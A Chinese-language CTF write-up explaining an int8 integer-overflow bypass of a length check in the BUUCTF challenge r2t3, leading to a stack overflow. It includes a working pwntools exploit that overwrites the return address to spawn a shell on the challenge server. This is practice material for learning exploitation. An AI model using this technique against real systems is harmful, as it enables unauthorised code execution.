---
title: 整形溢出
categories: 
    - Stack
    - 整形溢出
---
# 整形溢出
<!--more-->
## [BJDCTF 2nd]r2t3
来自buuctf

先看ida

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201123233054809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center)

buf缓冲区大小为408h，而read读取大小为400h，比buf要小，所以不能进行简单的缓冲区栈溢出。


再看name_check函数，v3是int8类型的变量，1111 1111 = 0xFF = 255。当0xFF +1的时侯，变量发生整形溢出，0x100 = 256 此时v3的数值为零（0000 0000），但是这只是显示了一个字节，其实再计算机里面会溢出，前面会进行进位操作变成 1 0000 0000。


同时还要满足3< v3 <8 的条件，这时候可以确定溢出数值是在 0x104~0x107 中

 




![在这里插入图片描述](https://img-blog.csdnimg.cn/20201123233312233.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center)



后面的strcpy()函数将s复制给dest,看到dest的偏移为0x11+4


程序中给出了/bin/sh的地址


exp：

```python
from pwn import *
#context.log_level = 'debug'
r=remote('node3.buuoj.cn',26213)
sys_addr = 0x08048594
payload = 'a' * (0x15) + p32(sys_addr) + 'a' * (0x104-0x19) # 0x15 + 0x4 + n = 0x104 
print(len(payload))
r.recvuntil('name:\n')
r.sendline(payload)
r.interactive()
```


Int8, 等于Byte, 占1个字节.

　   Int16, 等于short, 占2个字节. -32768 32767

　   Int32, 等于int, 占4个字节. -2147483648 2147483647

　   Int64, 等于long, 占8个字节. -9223372036854775808 9223372036854775807

   　这样, 看起来比short,int,long更加直观些!

　　 另外, 还有一个Byte, 它等于byte, 0 - 255.

　　所以说这里的v3是占一个字节的，一个字节是由8位二进制决定的。

　　例如：0000 0000 就是一个字节，代表0，1111 1111 也是一个字节，代表255.

[参考1](https://www.jianshu.com/p/757fe6d91669)
[参考2](https://www.cnblogs.com/bhxdn/p/12572580.html)


